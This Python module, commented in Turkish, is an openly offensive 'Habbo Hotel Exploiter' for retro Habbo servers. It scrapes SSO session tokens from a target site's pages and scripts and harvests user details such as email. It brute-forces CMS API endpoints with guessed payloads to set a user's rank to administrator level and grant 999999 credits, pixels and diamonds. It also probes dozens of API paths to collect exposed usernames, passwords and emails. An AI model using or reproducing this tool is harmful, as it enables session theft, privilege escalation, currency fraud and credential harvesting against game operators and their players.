#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Habbo Hotel Exploiter Modulu
SSO token cikarma, kullanici bilgisi toplama, rank/para manipulasyonu
ve dogrudan API exploitasyonu icin modul.
"""

import json
import re
import time
import sys
import os
import threading
from typing import Optional, Dict, List, Tuple, Any, Callable
from urllib.parse import urlparse

from utils.log_utils import Logger, LogLevel
from utils.network_utils import normalize_url

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False


class PacketManipulator:
    """
    Habbo Hotel exploitasyon modulu.
    SSO token cikarma, kullanici bilgisi toplama,
    rank/para manipulasyonu ve API exploitasyonu.
    """

    SSO_PATTERNS = [
        r'sso=([a-zA-Z0-9\-_\.]+)',
        r'ticket=([a-zA-Z0-9\-_\.]+)',
        r'auth_ticket=([a-zA-Z0-9\-_\.]+)',
        r'sso_ticket=([a-zA-Z0-9\-_\.]+)',
        r'["\']sso["\']\s*:\s*["\']([^"\']+)["\']',
        r'["\']ticket["\']\s*:\s*["\']([^"\']+)["\']',
        r'["\']auth_ticket["\']\s*:\s*["\']([^"\']+)["\']',
        r'["\']sso_ticket["\']\s*:\s*["\']([^"\']+)["\']',
        r'token=([a-zA-Z0-9\-_\.]+)',
        r'["\']token["\']\s*:\s*["\']([^"\']+)["\']',
    ]

    CMS_ENDPOINTS = {
        "atomcms": {
            "rank": "/api/users/rank",
            "currency": "/api/users/currency",
            "user": "/api/users",
            "admin": "/api/admin",
        },
        "revcms": {
            "rank": "/api/rank/set",
            "currency": "/api/currency/give",
            "user": "/api/user",
            "admin": "/api/admin/panel",
        },
        "phoenix": {
            "rank": "/api/player/rank",
            "currency": "/api/player/currency",
            "user": "/api/player",
            "admin": "/api/admin",
        },
        "ubercms": {
            "rank": "/api/rank/update",
            "currency": "/api/currency/add",
            "user": "/api/user/info",
            "admin": "/api/admin",
        },
        "habbocms": {
            "rank": "/api/user/rank",
            "currency": "/api/user/currency",
            "user": "/api/user/data",
            "admin": "/api/admin/panel",
        },
        "generic": {
            "rank": "/api/rank",
            "currency": "/api/currency",
            "user": "/api/user",
            "admin": "/admin",
        },
    }

    def __init__(
        self,
        target_url: str,
        logger: Optional[Logger] = None,
        gui_callback: Optional[Callable] = None,
    ):
        self.target_url = normalize_url(target_url) if target_url else target_url
        parsed = urlparse(self.target_url) if self.target_url else None
        self.hostname = parsed.hostname if parsed else None
        self.scheme = parsed.scheme if parsed else "https"
        self.logger = logger or Logger("PacketManipulator")
        self.gui_callback = gui_callback

        self.sso_token: Optional[str] = None
        self.user_info: Dict[str, Any] = {
            "id": None, "username": None, "rank": None,
            "credits": None, "pixels": None, "diamonds": None,
            "figure": None, "motto": None, "sso": None,
            "email": None, "ip": None,
        }
        self._stop_flag = threading.Event()
        self._results: Dict[str, Any] = {}

    def stop(self):
        self._stop_flag.set()

    def _log(self, level: str, message: str) -> None:
        if level == LogLevel.DEBUG:
            self.logger.debug(message)
        elif level == LogLevel.INFO:
            self.logger.info(message)
        elif level == LogLevel.SUCCESS:
            self.logger.success(message)
        elif level == LogLevel.WARNING:
            self.logger.warning(message)
        elif level == LogLevel.ERROR:
            self.logger.error(message)
        elif level == LogLevel.CRITICAL:
            self.logger.critical(message)
        if self.gui_callback:
            self.gui_callback(f"[{level}] {message}")

    def extract_sso_token(self) -> Optional[str]:
        """SSO tokenini sayfa kaynagindan ve JS dosyalarindan cikarir."""
        if not self.hostname or not HAS_REQUESTS:
            return None

        self._log("INFO", f"SSO token araniyor: {self.target_url}")

        try:
            session = requests.Session()
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            })

            response = session.get(self.target_url, timeout=15)
            html = response.text

            # HTML icinde SSO ara
            for pattern in self.SSO_PATTERNS:
                matches = re.findall(pattern, html, re.IGNORECASE)
                for match in matches:
                    token = match.strip()
                    if len(token) > 10:
                        self.sso_token = token
                        self.user_info["sso"] = token
                        self._log("SUCCESS", f"SSO token bulundu: {token[:40]}...")
                        return token

            # JS dosyalarinda ara
            js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html)
            for js_url in js_urls[:10]:
                if self._stop_flag.is_set():
                    break
                if not js_url.startswith("http"):
                    js_url = f"{self.scheme}://{self.hostname}/{js_url.lstrip('/')}"
                try:
                    js_resp = session.get(js_url, timeout=10)
                    for pattern in self.SSO_PATTERNS:
                        matches = re.findall(pattern, js_resp.text, re.IGNORECASE)
                        for match in matches:
                            token = match.strip()
                            if len(token) > 10:
                                self.sso_token = token
                                self.user_info["sso"] = token
                                self._log("SUCCESS", f"SSO token JS'de bulundu: {token[:40]}...")
                                return token
                except Exception:
                    continue

            # external_variables dosyasinda ara
            for ext_path in ["/external_variables", "/gamedata/external_variables", "/client/external_variables"]:
                try:
                    ext_url = f"{self.scheme}://{self.hostname}{ext_path}"
                    ext_resp = session.get(ext_url, timeout=10)
                    for pattern in self.SSO_PATTERNS:
                        matches = re.findall(pattern, ext_resp.text, re.IGNORECASE)
                        for match in matches:
                            token = match.strip()
                            if len(token) > 10:
                                self.sso_token = token
                                self.user_info["sso"] = token
                                self._log("SUCCESS", f"SSO token external_variables'da bulundu: {token[:40]}...")
                                return token
                except Exception:
                    continue

            self._log("WARNING", "SSO token bulunamadi")
            return None

        except Exception as e:
            self._log("ERROR", f"SSO token hatasi: {e}")
            return None

    def extract_user_info(self) -> Dict[str, Any]:
        """Kullanici bilgilerini sayfadan cikarir."""
        if not self.hostname or not HAS_REQUESTS:
            return self.user_info

        self._log("INFO", "Kullanici bilgileri cikariliyor...")

        try:
            session = requests.Session()
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            })

            response = session.get(self.target_url, timeout=15)
            html = response.text

            patterns = {
                "id": [r'"id"\s*:\s*(\d+)', r'userId\s*[=:]\s*(\d+)', r'user_id\s*[=:]\s*(\d+)'],
                "username": [r'"username"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"', r'username\s*[=:]\s*"([^"]+)"'],
                "rank": [r'"rank"\s*:\s*(\d+)', r'"rank_id"\s*:\s*(\d+)', r'rank\s*[=:]\s*(\d+)'],
                "credits": [r'"credits"\s*:\s*(\d+)', r'"credit"\s*:\s*(\d+)', r'credits\s*[=:]\s*(\d+)'],
                "pixels": [r'"pixels"\s*:\s*(\d+)', r'"duckets"\s*:\s*(\d+)', r'pixels\s*[=:]\s*(\d+)'],
                "diamonds": [r'"diamonds"\s*:\s*(\d+)', r'"diamond"\s*:\s*(\d+)', r'diamonds\s*[=:]\s*(\d+)'],
                "email": [r'"email"\s*:\s*"([^"]+)"', r'"mail"\s*:\s*"([^"]+)"', r'email\s*[=:]\s*"([^"]+)"'],
                "figure": [r'"figure"\s*:\s*"([^"]+)"', r'"look"\s*:\s*"([^"]+)"'],
                "motto": [r'"motto"\s*:\s*"([^"]+)"', r'"motto_text"\s*:\s*"([^"]+)"'],
            }

            for key, pattern_list in patterns.items():
                for pattern in pattern_list:
                    match = re.search(pattern, html, re.IGNORECASE)
                    if match:
                        value = match.group(1)
                        if key in ("id", "rank", "credits", "pixels", "diamonds"):
                            try:
                                value = int(value)
                            except ValueError:
                                pass
                        self.user_info[key] = value
                        self._log("SUCCESS", f"Bilgi bulundu: {key} = {value}")
                        break

            # JS dosyalarinda da ara
            if not any(v for v in [self.user_info.get(k) for k in ["id", "username", "rank"]]):
                js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html)
                for js_url in js_urls[:5]:
                    if self._stop_flag.is_set():
                        break
                    if not js_url.startswith("http"):
                        js_url = f"{self.scheme}://{self.hostname}/{js_url.lstrip('/')}"
                    try:
                        js_resp = session.get(js_url, timeout=10)
                        for key, pattern_list in patterns.items():
                            if self.user_info.get(key):
                                continue
                            for pattern in pattern_list:
                                match = re.search(pattern, js_resp.text, re.IGNORECASE)
                                if match:
                                    value = match.group(1)
                                    if key in ("id", "rank", "credits", "pixels", "diamonds"):
                                        try:
                                            value = int(value)
                                        except ValueError:
                                            pass
                                    self.user_info[key] = value
                                    self._log("SUCCESS", f"Bilgi JS'de bulundu: {key} = {value}")
                                    break
                    except Exception:
                        continue

            self._log("INFO", f"Kullanici bilgisi: {json.dumps({k:v for k,v in self.user_info.items() if v is not None}, ensure_ascii=False)}")

        except Exception as e:
            self._log("ERROR", f"Kullanici bilgisi hatasi: {e}")

        return self.user_info

    def modify_rank(self, new_rank: int = 7) -> bool:
        """CMS API uzerinden rank degistirmeyi dener."""
        if not self.hostname or not HAS_REQUESTS:
            self._log("ERROR", "Requests kutuphanesi gerekli")
            return False

        if not self.sso_token:
            self.extract_sso_token()

        self._log("INFO", f"Rank degistiriliyor: {new_rank}")

        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        })
        if self.sso_token:
            session.headers["Authorization"] = f"Bearer {self.sso_token}"

        payloads = [
            {"rank": new_rank, "user_id": self.user_info.get("id")},
            {"rank_id": new_rank, "userId": self.user_info.get("id")},
            {"rank": new_rank, "username": self.user_info.get("username")},
            {"new_rank": new_rank, "uid": self.user_info.get("id")},
            {"rank_level": new_rank, "id": self.user_info.get("id")},
            {"rank": new_rank, "sso": self.sso_token},
        ]

        for cms_name, endpoints in self.CMS_ENDPOINTS.items():
            if self._stop_flag.is_set():
                break
            rank_endpoint = endpoints.get("rank")
            if not rank_endpoint:
                continue

            url = f"{self.scheme}://{self.hostname}{rank_endpoint}"
            for payload in payloads:
                try:
                    r = session.post(url, json=payload, timeout=10)
                    if r.status_code in (200, 201, 204):
                        self._log("SUCCESS", f"Rank degisti! {cms_name}{rank_endpoint}")
                        self.user_info["rank"] = new_rank
                        return True
                except Exception:
                    continue

        self._log("WARNING", "Rank degistirilemedi")
        return False

    def modify_currency(self, currency_type: str = "credits", amount: int = 999999) -> bool:
        """CMS API uzerinden para birimi degistirmeyi dener."""
        if not self.hostname or not HAS_REQUESTS:
            return False

        if not self.sso_token:
            self.extract_sso_token()

        self._log("INFO", f"{currency_type} degistiriliyor: {amount}")

        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        })
        if self.sso_token:
            session.headers["Authorization"] = f"Bearer {self.sso_token}"

        currency_keys = {
            "credits": ["credits", "credit", "coins", "money", "points"],
            "pixels": ["pixels", "duckets", "pixel", "activity_points"],
            "diamonds": ["diamonds", "diamond", "premium", "vip_points"],
            "gotw": ["gotw", "gotw_points", "points", "seasonal"],
        }
        keys = currency_keys.get(currency_type, [currency_type])

        payloads = []
        for key in keys:
            payloads.extend([
                {key: amount, "user_id": self.user_info.get("id")},
                {key: amount, "userId": self.user_info.get("id")},
                {key: amount, "username": self.user_info.get("username")},
                {key: amount, "sso": self.sso_token},
                {"type": key, "amount": amount, "user_id": self.user_info.get("id")},
                {"currency": key, "value": amount, "userId": self.user_info.get("id")},
            ])

        for cms_name, endpoints in self.CMS_ENDPOINTS.items():
            if self._stop_flag.is_set():
                break
            currency_endpoint = endpoints.get("currency")
            if not currency_endpoint:
                continue

            url = f"{self.scheme}://{self.hostname}{currency_endpoint}"
            for payload in payloads:
                try:
                    r = session.post(url, json=payload, timeout=10)
                    if r.status_code in (200, 201, 204):
                        self._log("SUCCESS", f"{currency_type} degisti! {cms_name}{currency_endpoint}")
                        return True
                except Exception:
                    continue

        self._log("WARNING", f"{currency_type} degistirilemedi")
        return False

    def run_full_manipulation(
        self,
        modify_rank=True, new_rank=7,
        modify_credits=True, credit_amount=999999,
        modify_pixels=True, pixel_amount=999999,
        modify_diamonds=True, diamond_amount=999999,
        intercept_duration=15,
    ) -> Dict[str, Any]:
        """Tum manipulasyonlari calistirir."""
        self._log("CRITICAL", "=== HOTEL EXPLOITER BASLATILDI ===")
        self._log("INFO", f"Hedef: {self.target_url}")

        results = {
            "target": self.target_url,
            "sso_found": False,
            "user_info": {},
            "rank_modified": False,
            "credits_modified": False,
            "pixels_modified": False,
            "diamonds_modified": False,
            "errors": [],
        }

        # 1. SSO Token cikar
        self._log("INFO", "[1/5] SSO token cikariliyor...")
        token = self.extract_sso_token()
        results["sso_found"] = token is not None
        if token:
            self._log("SUCCESS", "SSO token basariyla cikarildi!")

        # 2. Kullanici bilgisi topla
        self._log("INFO", "[2/5] Kullanici bilgisi toplaniyor...")
        user_info = self.extract_user_info()
        results["user_info"] = {k: v for k, v in user_info.items() if v is not None}

        # 3. Rank degistir
        if modify_rank and not self._stop_flag.is_set():
            self._log("INFO", f"[3/5] Rank degistiriliyor (hedef: {new_rank})...")
            rank_ok = self.modify_rank(new_rank)
            results["rank_modified"] = rank_ok
            if rank_ok:
                self._log("SUCCESS", "Rank basariyla degistirildi!")

        # 4. Para birimlerini degistir
        if not self._stop_flag.is_set():
            self._log("INFO", "[4/5] Para birimleri degistiriliyor...")

            if modify_credits:
                cred_ok = self.modify_currency("credits", credit_amount)
                results["credits_modified"] = cred_ok
                if cred_ok:
                    self._log("SUCCESS", f"Krediler degisti: {credit_amount}")

            if modify_pixels:
                pix_ok = self.modify_currency("pixels", pixel_amount)
                results["pixels_modified"] = pix_ok
                if pix_ok:
                    self._log("SUCCESS", f"Pikseller degisti: {pixel_amount}")

            if modify_diamonds:
                dia_ok = self.modify_currency("diamonds", diamond_amount)
                results["diamonds_modified"] = dia_ok
                if dia_ok:
                    self._log("SUCCESS", f"Elmaslar degisti: {diamond_amount}")

        # 5. API exploitasyonu dene
        if not self._stop_flag.is_set():
            self._log("INFO", "[5/5] API exploitasyonu deneniyor...")
            api_results = self._exploit_api_endpoints()
            results["api_exploits"] = api_results

        self._log("CRITICAL", "=== HOTEL EXPLOITER TAMAMLANDI ===")
        self._results = results
        return results

    def _exploit_api_endpoints(self) -> List[Dict]:
        """Acik API endpointlerini dener ve exploit eder."""
        results = []
        if not self.hostname or not HAS_REQUESTS:
            return results

        api_paths = [
            "/api/me", "/api/user", "/api/users",
            "/api/admin", "/api/config",
            "/api/rank", "/api/ranks",
            "/api/currency", "/api/currencies",
            "/api/staff", "/api/staffs",
            "/api/permissions", "/api/rights",
            "/api/settings", "/api/status",
            "/api/health", "/api/info",
            "/api/version", "/api/ping",
            "/api/account", "/api/accounts",
            "/api/profile", "/api/profiles",
            "/api/v1/me", "/api/v1/user",
            "/api/v1/users", "/api/v1/admin",
            "/api/v1/config", "/api/v1/rank",
            "/api/v1/currency", "/api/v1/staff",
            "/api/v2/me", "/api/v2/user",
            "/api/v2/users", "/api/v2/admin",
            "/api/v2/config", "/api/v2/rank",
            "/api/v2/currency", "/api/v2/staff",
        ]

        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
        })
        if self.sso_token:
            session.headers["Authorization"] = f"Bearer {self.sso_token}"

        for path in api_paths:
            if self._stop_flag.is_set():
                break
            url = f"{self.scheme}://{self.hostname}{path}"
            try:
                r = session.get(url, timeout=8)
                if r.status_code == 200 and len(r.text) > 10:
                    try:
                        data = r.json()
                        results.append({"url": url, "status": 200, "data": str(data)[:200]})
                        self._log("SUCCESS", f"Acik API: {url}")
                        # Kullanici bilgisi bul
                        if isinstance(data, dict):
                            for key in ["username", "password", "email", "rank", "credits"]:
                                if key in data:
                                    self.user_info[key] = data[key]
                    except Exception:
                        results.append({"url": url, "status": 200, "data": r.text[:100]})
                        self._log("SUCCESS", f"Acik API (non-JSON): {url}")
            except Exception:
                continue

        return results
